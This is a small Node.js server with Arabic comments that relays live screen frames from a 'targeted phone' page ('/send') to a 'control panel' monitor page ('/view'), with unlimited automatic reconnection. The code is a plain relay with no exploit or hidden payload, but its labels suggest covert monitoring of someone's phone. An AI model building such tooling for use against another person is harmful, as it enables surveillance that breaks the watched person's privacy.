const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http, {
    reconnection: true,           // إعادة الاتصال تلقائياً
    reconnectionAttempts: Infinity, 
    reconnectionDelay: 1000       // المحاولة كل ثانية عند انقطاع النت
});

app.use(express.static('public'));

// مسارات الصفحات
app.get('/send', (req, res) => res.sendFile(__dirname + '/public/target.html'));
app.get('/view', (req, res) => res.sendFile(__dirname + '/public/monitor.html'));

io.on('connection', (socket) => {
    console.log('✅ هناك جهاز متصل الآن');

    // نقل البث من الهاتف للمراقب
    socket.on('screen_frame', (data) => {
        socket.broadcast.emit('update_monitor', data);
    });

    socket.on('disconnect', () => {
        console.log('❌ انقطع الاتصال.. السيرفر ينتظر عودة الجهاز تلقائياً');
    });
});

const PORT = 3000;
http.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل بنجاح!\n1. رابط الهاتف المستهدف: /send\n2. رابط لوحة تحكمك: /view`);
});
